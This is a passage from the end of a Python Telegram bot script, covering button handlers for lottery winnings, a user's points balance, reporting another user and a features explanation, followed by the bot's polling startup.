            user_points[user_id] = user_points.get(user_id, 0) + prize
            bot.send_message(user_id, t('lottery_win', lang).format(prize=prize, total=user_points[user_id]), reply_markup=get_back_markup(lang))

    # ===== نقاطي =====
    elif call.data == "my_points":
        pts = user_points.get(user_id, 0)
        need = max(0, 5000 - pts)
        bot.send_message(user_id, t('points_msg', lang).format(pts=pts, need=need), reply_markup=get_back_markup(lang))

    # ===== الإبلاغ =====
    elif call.data == "report_user":
        user_states[user_id] = 'waiting_report_username'
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton(t('btn_back', lang), callback_data="back_to_menu"))
        bot.send_message(user_id, t('report_enter', lang), reply_markup=markup)

    # ===== شرح الميزات =====
    elif call.data == "features_info":
        bot.send_message(user_id, t('features_text', lang), reply_markup=get_back_markup(lang))


print("Bot is running...")
bot.delete_webhook(drop_pending_updates=True)
bot.infinity_polling(timeout=20, long_polling_timeout=5)
